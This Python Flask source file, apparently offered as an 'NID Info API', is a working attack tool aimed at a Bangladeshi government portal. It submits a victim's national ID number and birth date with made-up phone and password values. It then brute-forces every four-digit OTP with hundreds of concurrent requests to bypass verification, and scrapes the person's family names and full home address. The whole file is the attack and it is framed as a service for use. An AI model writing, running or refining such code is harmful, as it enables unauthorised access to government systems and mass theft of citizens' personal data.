from flask import Flask, request, jsonify
import requests
import random
import string
import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor
import time
from datetime import datetime
import re

app = Flask(__name__)

# Configuration
MOBILE_PREFIX = "016"
BATCH_SIZE = 500
MAX_WORKERS = 100
TARGET_LOCATION = "http://fsmms.dgf.gov.bd/bn/step2/movementContractor/form"

# Enhanced headers from JavaScript code
BASE_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Cache-Control': 'max-age=0',
    'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'Origin': 'https://fsmms.dgf.gov.bd',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Accept-Language': 'en-US,en;q=0.9',
}

# Helper functions
def random_mobile(prefix):
    return prefix + ''.join([str(random.randint(0, 9)) for _ in range(7)])

def random_password():
    uppercase = random.choice(string.ascii_uppercase)
    chars = string.ascii_letters + string.digits
    random_chars = ''.join(random.choice(chars) for _ in range(8))
    return "#" + uppercase + random_chars

def generate_otp_range():
    return [str(i).zfill(4) for i in range(10000)]

class SessionManager:
    def __init__(self):
        self.session = requests.Session()
        self.cookies = None
    
    def update_cookies(self, new_cookies):
        self.cookies = new_cookies
        self.session.cookies.update(new_cookies)

# Enhanced session creation with proper headers
async def get_session_and_bypass(nid, dob, mobile, password):
    try:
        url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor'
        
        headers = BASE_HEADERS.copy()
        headers.update({
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/movementContractor'
        })

        data = {
            "nidNumber": nid,
            "email": "",
            "mobileNo": mobile,
            "dateOfBirth": dob,
            "password": password,
            "confirm_password": password,
            "next1": ""
        }

        session_manager = SessionManager()
        response = session_manager.session.post(
            url, 
            data=data, 
            headers=headers, 
            allow_redirects=False
        )

        if (response.status_code == 302 and 
            response.headers.get('location') and 
            'mov-verification' in response.headers.get('location')):
            
            session_manager.update_cookies(response.cookies)
            return session_manager
            
        else:
            raise Exception('Bypass Failed - Check NID and DOB')
            
    except Exception as error:
        raise Exception(f'Session creation failed: {str(error)}')

async def try_otp(session_manager, otp):
    try:
        url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step'
        
        headers = BASE_HEADERS.copy()
        headers.update({
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
        })

        data = {
            "otpDigit1": otp[0],
            "otpDigit2": otp[1],
            "otpDigit3": otp[2],
            "otpDigit4": otp[3]
        }

        response = session_manager.session.post(
            url, 
            data=data, 
            headers=headers, 
            allow_redirects=False
        )

        if (response.status_code == 302 and 
            response.headers.get('location') and 
            TARGET_LOCATION in response.headers.get('location')):
            return otp
        return None
        
    except Exception:
        return None

# Enhanced batch processing with concurrency
async def try_batch(session_manager, otp_batch):
    tasks = [try_otp(session_manager, otp) for otp in otp_batch]
    
    for task in asyncio.as_completed(tasks):
        result = await task
        if result:
            # Cancel other tasks if OTP found
            for t in tasks:
                if not t.done():
                    t.cancel()
            return result
    return None

async def fetch_form_data(session_manager):
    try:
        url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/form'
        
        headers = BASE_HEADERS.copy()
        headers.update({
            'Sec-Fetch-Site': 'cross-site',
            'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
        })

        response = session_manager.session.get(url, headers=headers)
        return response.text
        
    except Exception as error:
        raise Exception(f'Form data fetch failed: {str(error)}')

def extract_fields(html, ids):
    result = {}

    for field_id in ids:
        pattern = f'<input[^>]*id="{field_id}"[^>]*value="([^"]*)"'
        match = re.search(pattern, html)
        result[field_id] = match.group(1) if match else ""

    return result

def enrich_data(contractor_name, result, nid, dob):
    mapped = {
        "nameBangla": contractor_name,
        "nameEnglish": "",
        "nationalId": nid,
        "dateOfBirth": dob,
        "fatherName": result.get("fatherName", ""),
        "motherName": result.get("motherName", ""),
        "spouseName": result.get("spouseName", ""),
        "gender": "",
        "religion": "",
        "birthPlace": result.get("nidPerDistrict", ""),
        "nationality": result.get("nationality", ""),
        "division": result.get("nidPerDivision", ""),
        "district": result.get("nidPerDistrict", ""),
        "upazila": result.get("nidPerUpazila", ""),
        "union": result.get("nidPerUnion", ""),
        "village": result.get("nidPerVillage", ""),
        "ward": result.get("nidPerWard", ""),
        "zip_code": result.get("nidPerZipCode", ""),
        "post_office": result.get("nidPerPostOffice", "")
    }

    address_parts = [
        f"বাসা/হোল্ডিং: {result.get('nidPerHolding', '-')}",
        f"গ্রাম/রাস্তা: {result.get('nidPerVillage', '')}",
        f"মৌজা/মহল্লা: {result.get('nidPerMouza', '')}",
        f"ইউনিয়ন ওয়ার্ড: {result.get('nidPerUnion', '')}",
        f"ডাকঘর: {result.get('nidPerPostOffice', '')} - {result.get('nidPerZipCode', '')}",
        f"উপজেলা: {result.get('nidPerUpazila', '')}",
        f"জেলা: {result.get('nidPerDistrict', '')}",
        f"বিভাগ: {result.get('nidPerDivision', '')}"
    ]

    filtered_parts = []
    for part in address_parts:
        parts = part.split(": ")
        if len(parts) > 1 and parts[1].strip() and parts[1] != "-":
            filtered_parts.append(part)

    address_line = ", ".join(filtered_parts)

    mapped["permanentAddress"] = address_line
    mapped["presentAddress"] = address_line

    return mapped

# API Routes
@app.route('/')
def home():
    return jsonify({
        "message": "Enhanced NID Info API is running",
        "status": "active",
        "endpoints": {
            "getInfo": "/get-info?nid=YOUR_NID&dob=YYYY-MM-DD"
        },
        "features": {
            "enhancedHeaders": True,
            "concurrentOTP": True,
            "improvedPasswordGeneration": True,
            "mobilePrefix": MOBILE_PREFIX
        }
    })

@app.route('/get-info')
async def get_info():
    try:
        nid = request.args.get('nid')
        dob = request.args.get('dob')

        if not nid or not dob:
            return jsonify({"error": "NID and DOB are required"}), 400

        print(f"Processing request for NID: {nid}, DOB: {dob}")

        # Generate random credentials with enhanced password
        password = random_password()
        mobile = random_mobile(MOBILE_PREFIX)

        print(f"Using Mobile: {mobile}")
        print(f"Using Password: {password}")

        # 1. Get session and bypass initial verification
        print("Step 1: Getting session and bypassing verification...")
        session_manager = await get_session_and_bypass(nid, dob, mobile, password)
        print("✓ Initial bypass successful")

        # 2. Generate and shuffle OTPs
        print("Step 2: Generating OTP range...")
        otp_range = generate_otp_range()
        random.shuffle(otp_range)

        # 3. Try OTPs in batches with enhanced concurrency
        print("Step 3: Brute-forcing OTP...")
        found_otp = None

        for i in range(0, len(otp_range), BATCH_SIZE):
            batch = otp_range[i:i + BATCH_SIZE]
            print(f"Trying batch {i//BATCH_SIZE + 1}/{(len(otp_range) + BATCH_SIZE - 1)//BATCH_SIZE}...")

            found_otp = await try_batch(session_manager, batch)
            if found_otp:
                print(f"✓ OTP found: {found_otp}")
                break

        if found_otp:
            # 4. Fetch form data
            print("Step 4: Fetching form data...")
            html = await fetch_form_data(session_manager)

            ids = [
                "contractorName", "fatherName", "motherName", "spouseName", 
                "nidPerDivision", "nidPerDistrict", "nidPerUpazila", "nidPerUnion", 
                "nidPerVillage", "nidPerWard", "nidPerZipCode", "nidPerPostOffice",
                "nidPerHolding", "nidPerMouza"
            ]

            extracted_data = extract_fields(html, ids)
            final_data = enrich_data(
                extracted_data.get("contractorName", ""), 
                extracted_data, nid, dob
            )

            print("✓ Success: Data retrieved successfully")
            
            # Enhanced response with additional info
            return jsonify({
                "success": True,
                "data": final_data,
                "sessionInfo": {
                    "mobileUsed": mobile,
                    "otpFound": found_otp
                }
            })

        else:
            print("✗ Error: OTP not found")
            return jsonify({
                "success": False,
                "error": "OTP not found after trying all combinations"
            }), 404

    except Exception as error:
        print(f"Error: {str(error)}")
        return jsonify({
            "success": False,
            "error": str(error)
        }), 500

# Enhanced health check endpoint
@app.route('/health')
def health():
    return jsonify({
        "status": "OK",
        "timestamp": datetime.now().isoformat(),
        "service": "Enhanced NID Info API",
        "version": "2.0.0"
    })

# New endpoint to test credentials generation
@app.route('/test-creds')
def test_creds():
    mobile = random_mobile(MOBILE_PREFIX)
    password = random_password()
    
    return jsonify({
        "mobile": mobile,
        "password": password,
        "note": "These are randomly generated test credentials"
    })

if __name__ == '__main__':
    print("🚀 Enhanced NID Info API running on port 3000")
    print("📍 Main endpoint: http://localhost:3000/get-info?nid=YOUR_NID&dob=YYYY-MM-DD")
    print("🔧 Test endpoint: http://localhost:3000/test-creds")
    print("❤️  Health check: http://localhost:3000/health")
    
    app.run(host='0.0.0.0', port=3000, debug=False)
